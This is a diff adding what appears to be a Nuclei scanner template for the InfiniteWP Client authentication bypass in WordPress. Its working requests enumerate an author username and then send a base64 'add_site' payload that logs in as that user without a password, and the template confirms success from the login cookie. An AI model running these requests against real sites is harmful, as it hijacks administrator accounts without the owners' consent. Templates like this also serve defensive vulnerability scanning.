@@ -1,0 +1,69 @@
+id: wordpress-infinitewp-auth-bypass
+
+info:
+  name: WordPress InfiniteWP Client Authentication Bypass
+  author: princechaddha
+  severity: critical
+  reference: https://www.wordfence.com/blog/2020/01/critical-authentication-bypass-vulnerability-in-infinitewp-client-plugin/
+  tags: wordpress,auth-bypass,wp-plugin
+
+requests:
+  - raw:
+      - |
+        GET /?author=1 HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Language: en-US,en;q=0.9
+        Connection: close
+
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:72.0) Gecko/20100101 Firefox/72.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+        Cache-Control: max-age=0
+        Content-Type: application/x-www-form-urlencoded
+        ContentLength: 3537
+
+        _IWP_JSON_PREFIX_{{base64("{\"iwp_action\":\"add_site\",\"params\":{\"username\":\"§username§\"}}")}}
+
+    redirects: true
+
+    extractors:
+      - type: regex
+        name: username
+        internal: true
+        group: 1
+        part: body
+        regex:
+          - 'Author:(?:[A-Za-z0-9 -\_="]+)?<span(?:[A-Za-z0-9 -\_="]+)?>([A-Za-z0-9]+)<\/span>'
+
+      - type: regex
+        name: username
+        internal: true
+        group: 1
+        part: header
+        regex:
+          - 'ion: https:\/\/[a-z0-9.]+\/author\/([a-z]+)\/'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "wordpress_logged_in"
+        part: header
+
+      - type: word
+        words:
+          - "<IWPHEADER>"
+
+        part: body
+      - type: status
+        status:
+          - 200
